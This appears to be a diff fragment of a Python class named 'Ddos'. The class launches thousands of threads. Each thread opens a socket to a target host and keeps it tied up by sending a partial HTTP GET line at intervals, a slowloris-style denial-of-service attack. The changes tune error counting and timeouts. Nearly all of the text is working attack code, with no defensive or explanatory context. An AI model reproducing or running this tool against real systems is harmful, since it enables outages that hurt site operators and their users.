@@ -13,7 +13,7 @@ class Ddos(Thread):
         self.errorsCount += 1
     def run(self):
         i=0
-        while ( i < 3060):
+        while (self.errorsCount < self.errorMax) and ( i < 3060):
             thread = Thread(target=self.attack, args=(self.ip, self.port))
             thread.start()
             if(i>3000):
@@ -33,10 +33,9 @@ class Ddos(Thread):
         print("ici")
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(50000)
+            s.settimeout(50)
             s.connect((ip, port))
             s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
-            i = 0
             while True:
                 try:
                     time.sleep(10)
@@ -49,7 +48,7 @@ class Ddos(Thread):
                         s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                     except socket.error as e2:
                         self.countError()
-                        break
+
             s.close()
         except socket.error as e2:
             self.countError()
